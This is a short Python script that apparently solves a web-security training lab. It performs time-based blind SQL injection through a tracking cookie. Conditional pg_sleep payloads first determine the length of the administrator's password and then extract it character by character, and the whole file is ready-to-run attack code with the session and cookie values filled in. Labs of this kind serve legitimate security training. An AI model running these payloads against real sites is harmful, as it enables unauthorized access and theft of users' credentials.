                #  FINDING THE LENGTH OF THE PASSWORD BY ITERNATING FROM 1 TO 101
                #  Change the session and tracking id by yours otherwise it will not run
import requests


url='https://0a5300820444f27888b6f51800a900d8.web-security-academy.net/filter?category=Gifts'
def get_length():
    for i in range(1,101):
        cookie={'TrackingId':'MR5PrkIhlAYizlhQ','session':'cyF5628Pz0oeO2wr0zm5oBOeNczpF20H'}
        payload=f"' ||  CASE WHEN ((LENGTH((SELECT password FROM users where username='administrator')))={i}) THEN pg_sleep(10) ELSE pg_sleep(0) END || '"
        cookie['TrackingId']=cookie['TrackingId'] + payload
        r=requests.get(url,cookies=cookie)
        if r.elapsed.total_seconds() > 2 :
            return i
        
# len=get_length()
# print(f"Password length is {len}")


                        # FINDING THE PASSWORD 
characters='abcdefghijklmnopqrstuvwxyz0123456789'
def get_pass():
    str=''
    for i in range(1,21):
        for char in characters:
            cookie={'TrackingId':'MR5PrkIhlAYizlhQ','session':'cyF5628Pz0oeO2wr0zm5oBOeNczpF20H'}
            payload=f"' || CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1) = '{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END || '--"
            cookie['TrackingId']=cookie['TrackingId'] + payload
            r=requests.get(url,cookies=cookie)
            if r.elapsed.total_seconds() >  2:
                print(char)
                str+=char
                break
    return str
call=get_pass()
print(call)